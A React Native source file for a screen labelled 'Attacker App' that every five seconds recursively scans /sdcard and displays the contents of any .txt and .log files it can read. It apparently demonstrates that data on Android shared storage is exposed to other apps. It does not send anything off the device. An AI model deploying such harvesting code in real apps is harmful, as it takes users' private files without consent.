import React, { useEffect, useState } from 'react';
import {
    Button,
    SafeAreaView,
    ScrollView,
    Text,
    View,
    StyleSheet,
} from 'react-native';
import RNFS from 'react-native-fs';
import { useNavigation } from '@react-navigation/native';

const ROOT_PATH = '/sdcard';
const SCAN_INTERVAL = 5; // seconds

export default function SecretScanner() {
  const navigation = useNavigation();
  const [scannedFiles, setScannedFiles] = useState([]);
  const [fileContents, setFileContents] = useState({});
  const [countdown, setCountdown] = useState(SCAN_INTERVAL);

  useEffect(() => {
    const scanAllFiles = async (dirPath) => {
      let allFiles = [];
      try {
        const items = await RNFS.readDir(dirPath);
        for (const item of items) {
          if (item.isDirectory()) {
            const subFiles = await scanAllFiles(item.path);
            allFiles = allFiles.concat(subFiles);
          } else {
            allFiles.push(item.path);
          }
        }
      } catch (err) {
        // skip unreadable or permission-denied folders
      }
      return allFiles;
    };

    const readFilesPeriodically = async () => {
      const paths = await scanAllFiles(ROOT_PATH);
      const newFileContents = {};

      for (const file of paths) {
        if (file.endsWith('.txt') || file.endsWith('.log')) {
          try {
            const content = await RNFS.readFile(file, 'utf8');
            newFileContents[file] = content;
          } catch (e) {
            // skip unreadable file
          }
        }
      }

      setScannedFiles(paths);
      setFileContents(newFileContents);
    };

    // Start countdown timer for refresh
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          readFilesPeriodically();
          return SCAN_INTERVAL;
        }
        return prev - 1;
      });
    }, 1000);

    readFilesPeriodically(); // initial scan
    return () => clearInterval(timer);
  }, []);

  return (
    <SafeAreaView style={styles.container}>
      <Text style={styles.header}>🕵️ Attacker App – Scanning Files</Text>
      <Text style={styles.subheader}>⏳ Next scan in {countdown}s</Text>
      <ScrollView>
        {Object.keys(fileContents).map((filePath) => (
          <View key={filePath} style={styles.fileBlock}>
            <Text style={styles.filePath}>{filePath}</Text>
            <Text selectable style={styles.fileContent}>
              {fileContents[filePath].slice(0, 1000) || '(Empty)'}
            </Text>
          </View>
        ))}
      </ScrollView>
      <Button title="Return" onPress={() => navigation.goBack()} />
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, padding: 16 },
  header: { fontSize: 20, fontWeight: 'bold', marginBottom: 6 },
  subheader: { fontSize: 12, color: 'gray', marginBottom: 12 },
  fileBlock: { marginBottom: 16, padding: 10, backgroundColor: '#f1f1f1', borderRadius: 6 },
  filePath: { fontSize: 13, fontWeight: 'bold', marginBottom: 4 },
  fileContent: { fontFamily: 'monospace', fontSize: 12 },
});